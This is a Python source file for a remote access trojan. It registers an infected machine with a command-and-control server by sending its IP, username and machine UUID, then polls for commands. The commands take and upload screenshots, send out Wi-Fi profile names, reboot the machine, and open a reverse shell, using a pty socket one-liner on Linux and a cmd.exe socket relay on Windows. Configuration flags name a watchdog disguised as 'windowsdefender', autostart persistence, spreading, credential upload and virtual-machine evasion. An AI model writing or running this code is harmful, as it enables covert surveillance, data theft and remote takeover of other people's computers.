import platform
import os
import subprocess
import requests
import time
import threading
import shlex
import random
import getpass
import platform
import pyautogui
import datetime
import PIL

OS = platform.uname()[0]
print(OS)
if OS == "Windows":
    current_machine_id = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()

if OS == "Windows":
        import pyautogui
else:pass
    
# PAYLOAD OPTIONS #

### ENABLE REMOTE SHELL ###
_RSHELL_OPT = 1

### ATTEMPT TO SPREAD TO A LOCAL PC OR DEVICE ###
_SPREAD_OPT = 0
_FAST_ROOT_OPT = 0
_AUTO_UPLOAD_CREDS_OPT = 0

_PAYLOAD_NAME = "payload"
_WATCHDOG_NAME = "windowsdefender"

### IF AUTO START == 1, WATCHDOG WILL CHECK THAT IT IS RUNNING IN AUTOSTART MODE
_AUTOSTART_WATCHDOG = 1
_AUTOSTART_WATCHDOG_DESKTOP_SHORTCUTS = 0

### FULL ADDRESS TO THE WEBSERVER
_WEB_SERVER = "127.0.0.1:3000"

### REMOVE FROM STARTUP UNRIL TASKMANAGER IS CLOSED WINDOWS ONLY ####
_WIN_TASK_MANANGER_REMOVE_STARTUP = 0

### DETECT VIRTUAL MACHINE ###
_REMOVE_IF_IN_VM = 1

### PAYLOAD STAGING OPTIONS ###
# 1 = EVAL SCRIPT FROM URL IN MEMORY#
# 2 = DOWNLOAD BINARY TO DISK AND EXECUTE #
_STAGING_OPT = 1

_REG_URL = 'http://{0}/register'.format(_WEB_SERVER)
_CHECK_IF_REGISTERED = 'http://{0}/check_if_registered'.format(_WEB_SERVER)
_CHECK_FOR_COMMAND = 'http://{0}/command'.format(_WEB_SERVER)
_OS = platform.uname()[0]
username = getpass.getuser()

def get_ip():
        try:
                proc = requests.get('http://{0}/getip'.format(_WEB_SERVER))
                return proc.content.decode('utf8')

        except Exception as e:
            pass

_MY_IP = get_ip()
while _MY_IP == None:
    _MY_IP = get_ip()

def register():
    try:
        requests.get(_REG_URL + '/{0}/{1}/{2}/{3}'.format(_MY_IP, username, _OS, current_machine_id ))
    except Exception as e:
        pass

#   CHECK IF RAT IS ALREADY REGISTERED  #
def chk_register():
    try:

        if requests.get(_CHECK_IF_REGISTERED + '/{0}/{1}/{2}'.format(_MY_IP, username, current_machine_id)).content.decode('utf8') == 'True':
            return 1
        else:
            return 0
    except requests.exceptions.ConnectionError as e:
        
        pass

def upload_screenshot(SCREENSHOT):
        try:
            
            with open(SCREENSHOT, "rb") as f:
                requests.post("http://{0}/upload/screenshot/{1}/{2}/{3}".format(_WEB_SERVER, _MY_IP, username, current_machine_id ), files={"file": f})
            
        except Exception as e:
            pass

def get__RSHELL_OPT_ip():
        try:
            proc = requests.get('http://{0}/rshell/{1}/{2}/{3}'.format(_WEB_SERVER, _MY_IP, getpass.getuser(), current_machine_id))
            return proc.content.decode('utf8')
        except Exception as e:
            pass

def _RSHELL_OPT_():
        print(get__RSHELL_OPT_ip().split()[0])
        print(get__RSHELL_OPT_ip().split()[1])
        try:
            if platform.uname()[0] == "Linux":
                    try:
                        exec('import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'.format(get__RSHELL_OPT_ip().split()[0], get__RSHELL_OPT_ip().split()[1]))
                    except Exception as e:
                        print(e)
                        timer = threading.Timer(5, _RSHELL_OPT_)
                        timer.start()
                        pass
                        
            elif platform.uname()[0] == "Windows":
                import os,socket,subprocess,threading;
                def s2p(s, p):
                    while True:
                        data = s.recv(1024)
                        if len(data) > 0:
                            p.stdin.write(data)
                            p.stdin.flush()

                def p2s(s, p):
                    while True:
                        s.send(p.stdout.read(1))
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect(("{0}".format(get__RSHELL_OPT_ip().split()[0]), int(get__RSHELL_OPT_ip().split()[1])))
                p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)
                s2p_thread = threading.Thread(target=s2p, args=[s, p])
                s2p_thread.daemon = True
                s2p_thread.start()
                p2s_thread = threading.Thread(target=p2s, args=[s, p])
                p2s_thread.daemon = True
                p2s_thread.start()
                try:
                    p.wait()
                except KeyboardInterrupt:
                    s.close()
                    timer = threading.Timer(5, _RSHELL_OPT_)
                    timer.start()
                    pass
        except Exception as e:
            print(e)     
            pass
    
def insert_wifi_name(wifi_name):
        try:
            proc = requests.get('http://{0}/wifi_name/{1}/{2}'.format(_WEB_SERVER, current_machine_id, wifi_name))

        except Exception as e:
            pass
        
def wait_for_command():
    try:
        time.sleep(random.randrange(5, 15))
        command = requests.get(_CHECK_FOR_COMMAND + '/{0}/{1}/{2}'.format(_MY_IP, username, current_machine_id)).content.decode('utf8')
        if command == ' ':
            pass
        
        if command == "screenshot":
            if _OS == "Linux":
                pass

            elif _OS == "Windows":
                now = datetime.datetime.now() # current date and time
                date_time = now.strftime("%H_%M_%S")

                _SCREEN_SHOT = pyautogui.screenshot()
                _SCREEN_SHOT.save(r"{0}\SS_{1}_{2}.png".format(os.getcwd(), username, date_time))
                upload_screenshot(r"{0}\SS_{1}_{2}.png".format(os.getcwd(), username, date_time))
                os.remove(r"{0}\SS_{1}_{2}.png".format(os.getcwd(), username, date_time))
        
        if command == "camshot":
            if _OS == "Linux":
                pass

            elif _OS == "Windows":
                pass

        if command == "reboot":
            if _OS == "Linux":
                subprocess.call("reboot")

            elif _OS == "Windows":
                subprocess.call("shutdown -R")

        
        if command == "record":
            if _OS == "Linux":
                pass

            elif _OS == "Windows":
                pass

        if command == "rshell":
                t1 = threading.Thread(None, _RSHELL_OPT_)
                t1.start()


        if command == "reboot":
            if _OS == "Linux":
                pass

            elif _OS == "Windows":
                subprocess.call("shutdown -R")

        if command == "killswitch":
            if _OS == "Linux":
                pass

            elif _OS == "Windows":
                subprocess.call("shutdown -R")

        if command == "getwifi":
            if _OS == "Linux":
                pass
            
            elif _OS == "Windows":
                meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
                data = meta_data.decode('utf-8', errors ="backslashreplace")
                data = data.split("\\n")
                names = []
                
                for i in data:
                    if "All User Profile" in i :
                        i = i.split(":")
                        i = i[1]
                        i = i[1:-1]

                        names.append(i)
                        
                for name in names:
                    insert_wifi_name(name)
    
            

    except requests.exceptions.ConnectionError:
        pass
    except FileNotFoundError:
        pass
   
def exec_command(command):
    cmd = shlex.split(command)
    subprocess.call(cmd)

username = getpass.getuser()
if username == 'root':
    root = 1

while 1:
    if chk_register() == 1:
        while 1:
            wait_for_command()
            
    else:
        register()
        continue
    

    
